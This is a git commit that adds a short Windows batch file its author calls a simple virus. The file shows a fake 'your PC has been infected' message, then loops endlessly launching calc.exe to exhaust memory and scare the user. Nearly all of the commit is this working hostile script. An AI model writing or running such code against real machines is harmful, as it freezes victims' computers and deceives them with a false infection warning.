c59edff0f86570e4ce4885e43d081cc5155a0f1c
Juan Carlos Estevez Vargas <juank2001estevez@gmail.com>
2022-10-02 13:34:59 -0500

    Virus sencillo, el cual se encarga de mostrar infinitos mensajes para asustar al usuario y consumir RAM de manera excesiva.

---
+++ bucle-de-mensajes.bat
@@ -0,0 +1,7 @@
+REM virus simple en cual se encarga de mostrar diferentes mensajes en bucle infinito para consumir ram y asustar al usuario.	
+
+@echo on
+msg * Tu PC ha sido infectada con un potente virus.
+:virus
+start calc.exe
+goto :virus
